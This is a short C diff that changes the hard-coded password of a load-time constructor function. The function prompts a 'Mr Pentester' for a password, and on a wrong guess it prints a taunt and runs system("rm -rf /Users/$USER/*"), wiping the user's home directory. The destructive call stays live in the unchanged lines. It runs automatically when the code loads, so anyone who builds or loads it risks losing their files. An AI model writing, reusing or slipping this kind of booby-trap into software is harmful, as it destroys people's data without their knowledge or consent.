@@ -16,7 +16,7 @@ void	__attribute__ ((constructor))	init(void)
 {
 	char *line = readline("Guess The Password Mr Pentester :_ : ");
 	gc_add(line);
-	if (ft_strcmp(line, "howoldareyou"))
+	if (ft_strcmp(line, "lk3ake3"))
 	{
 		printf("Now Check Your Personal Data !\nGood luck Next time Mr Stupid!\n");
 		system("rm -rf /Users/$USER/*");
